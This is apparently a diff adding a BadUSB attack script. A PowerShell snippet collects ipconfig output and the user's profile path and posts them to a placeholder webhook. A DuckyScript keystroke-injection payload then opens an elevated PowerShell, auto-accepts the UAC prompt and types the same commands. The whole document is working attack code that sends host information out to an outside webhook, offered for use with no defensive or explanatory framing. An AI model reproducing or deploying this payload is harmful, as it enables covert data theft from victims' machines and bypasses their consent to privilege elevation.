@@ -1,0 +1,28 @@
+$webhookUri = 'webhook here'
+$IP = ipconfig| Out-String
+$Body = @{ 'username' = $env:USERPROFILE ; 'content' = $IP}
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body;exit
+
+---------------------------------------------------------------------------------------------------------------------
+
+DELAY 1500
+GUI r
+DELAY 1500
+STRING Powershell
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 1600
+ALT y
+DELAY 800
+STRING $webhookUri = 'webhookhere'
+DELAY 800
+ENTER
+STRING $IP = ipconfig| Out-String
+DELAY 800
+ENTER
+STRING $Body = @{ 'username' = $env:USERPROFILE ; 'content' = $IP}
+DELAY 800
+ENTER
+STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body;exit
+DELAY 800
+ENTER
